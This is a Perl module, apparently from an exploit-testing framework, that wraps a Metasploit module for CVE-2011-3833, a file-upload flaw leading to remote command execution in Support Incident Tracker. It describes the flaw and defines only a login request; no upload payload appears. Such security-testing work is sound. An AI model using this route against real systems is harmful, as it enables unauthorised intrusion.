package SIT::MSF::SitFileUpload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SitFileUpload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2011-3833",
  DESCRIPTION => "

          This module combines two separate issues within Support Incident Tracker (<= 3.65)

        application to upload arbitrary data and thus execute a shell. The two issues exist

        in ftp_upload_file.php.

        The first vulnerability exposes the upload dir used to store attachments.

        The second vulnerability allows arbitrary file upload since there is no

        validation function to prevent from uploading any file type.

        Authentication is required to exploit both vulnerabilities.

      ",
  MSF_MODULE => "sit_file_upload",
  OSVDB => 77003,
  REFERENCES => [
    "http://secunia.com/secunia_research/2011-75/",
    "http://secunia.com/secunia_research/2011-79/",
  ],
  TITLE => "Support Incident Tracker Remote Command Execution",


  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'login.php',
      PAYLOAD      => 'username=__USERNAME__&password=__PASSWORD__',
      TEXT   => 'Sending Exploit #1 Request : [POST] /login.php',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
